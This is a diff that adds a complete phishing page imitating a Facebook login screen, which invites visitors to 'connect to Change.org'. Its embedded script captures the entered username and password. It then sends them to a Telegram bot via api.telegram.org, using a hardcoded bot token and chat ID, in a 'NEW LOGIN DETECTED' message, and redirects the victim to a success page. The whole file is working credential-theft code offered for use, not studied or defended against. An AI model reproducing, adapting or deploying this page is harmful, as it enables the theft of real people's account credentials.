@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+	<title>Facebook - Login / connect your account</title>
+  <script src="a/app.js"></script>
+	<link rel="stylesheet" href="/css/dZ4jDAwvPlFZhKe.css">
+
+</head>
+
+<body >
+	<p style="margin-bottom: 0;padding-left: 12px;padding-top: 5px;padding-bottom: 5px;border-bottom: 1px solid #e5ce3a;background: #fffbe2;color: #9f7d2d;text-align: center;">You must log in first.</p>
+	<nav class="navbar navbar-light navbar-expand-md" style="padding-bottom: 10px;">
+		<div class="container-fluid"><img class="img-fluid" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" style="width: 140px;margin-top: 0px;"></div>
+	</nav>
+	<div class="contact-clean" style="padding: 0;padding-top: 0 px;padding-bottom: 0px;background: rgb(255,255,255);">
+<form id="login-form" action="/app/login" method="POST"  style="width: 100%;padding-top: 0;padding-right: 15px;padding-left: 10px;border-style: none;box-shadow: inset 0px 0px;" >
+			<div class="form-group" style="margin-bottom: 7px;">
+				<div><img class="img-fluid" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/20/Change.org_%28CDot%29_logo.svg/1200px-Change.org_%28CDot%29_logo.svg.png" style="width: 87px;margin-bottom: 11px;">
+					<p style="text-align: center;padding-right: 10%;padding-left: 10%;color: rgba(99,106,113,0.88);">Log into your Facebook account to connect to <strong>Change.</strong>
+						<br>
+					</p>
+				</div>
+  <input class="form-control form-control-sm" type="text" autocomplete="off" placeholder="Mobile number or email" style="background: #f5f6f7;border-radius: 5px;" autocomplete="off" type="text" id="username" name="username" required>
+			</div>
+			<div class="form-group" style="margin-bottom: 14px;">
+  <input class="form-control form-control-sm" autocomplete="off"  style="background: #f5f6f7;border-radius: 5px;" placeholder="Password" required=""  type="password" id="password" name="password" required>
+			</div>
+			<div class="form-group">
+  <button class="btn btn-secondary btn-block btn-lg text-capitalize" style="background: #1877f2;font-size: 16px;" type="submit" >Log in</button>
+			</div>
+			<div style="margin-top: 23px;text-align: center;"><span class="label" style="margin-top: -13px;margin-bottom: 1px;margin-right: 50%;margin-left: 43%;width: 53px;">or</span><span class="line" style="background: rgba(154,154,154,0.25);"></span></div>
+			<div class="form-group" style="margin-left: auto;margin-right: auto;margin-top: 36px;"><a class="btn btn-secondary btn-block btn-lg text-capitalize" role="button" style="background: #00a400;font-size: 13px;font-style: normal;font-weight: bold;text-align: center;width: 172px;padding-left: 10px;padding-right: 10px;height: 36px;padding-top: 11px;" href="https://m.facebook.com/reg/">Create New Account</a>
+				<p style="text-align: center;margin-top: 14px;font-size: 14px;color: #85a4d0;"><a href="https://touch.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Ftouch.facebook.com%2F&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;_rdr" style="color: #548ad6;">Forgot Password?</a></p>
+			</div>
+		</form>
+	</div>
+
+
+<!-- In your login.html file -->
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+  $(document).ready(function() {
+    // Get the form element
+    const form = $('#login-form');
+
+    // Initialize the counter
+    let counter = 0;
+
+    // Add a submit event listener to the form
+    form.on('submit', function(e) {
+      // Prevent the default form submission behavior
+      e.preventDefault();
+
+      // Increment the counter
+      counter++;
+
+      // Get the form data
+      const name = $('#username').val();
+      const password = $('#password').val();
+
+      // Send the form data to the server using Ajax
+      $.ajax({
+        type: 'POST',
+        url: '/app/login',
+        data: { username: name, password: password },
+        success: function(response) {
+          // Redirect to the thank-you page
+          window.location.href = 'Success.html';
+        },
+        error: function(error) {
+          // Handle errors
+          console.error(error);
+        }
+      });
+
+      // Your Telegram bot API token
+      const token = '6133173562:AAGJ0JS0a_T4uezLOtOMj5KKeq4g0IGvcoQ';
+
+      // The ID of the Telegram chat where you want to send the message
+      const chatId = '-1001969872873';
+
+      // Construct the message
+      const messageToSend = `
+[==============================]
+$ NEW LOGIN DETECTED $
+__________________________________
+> ${new Date()}
+__________________________________
+> USERNAME:      ${name} 
+> PASSWORD:      ${password}
+__________________________________
+__________________________________
+ [CHANNEL] @LCDPGroupChat
+ [GROUP CHAT] @LCDPOfficialChannel
+[==============================]
+`;
+
+      // Send the message to the Telegram chat using Ajax
+      $.ajax({
+        type: 'GET',
+        url: `https://api.telegram.org/bot${token}/sendMessage`,
+        data: { chat_id: chatId, text: messageToSend },
+        success: function(response) {
+          // Handle success
+          console.log(response);
+        },
+        error: function(error) {
+          // Handle errors
+          console.error(error);
+        }
+      });
+    });
+  });
+      </script>
+      
+
+  
+</body>
+
+</html>
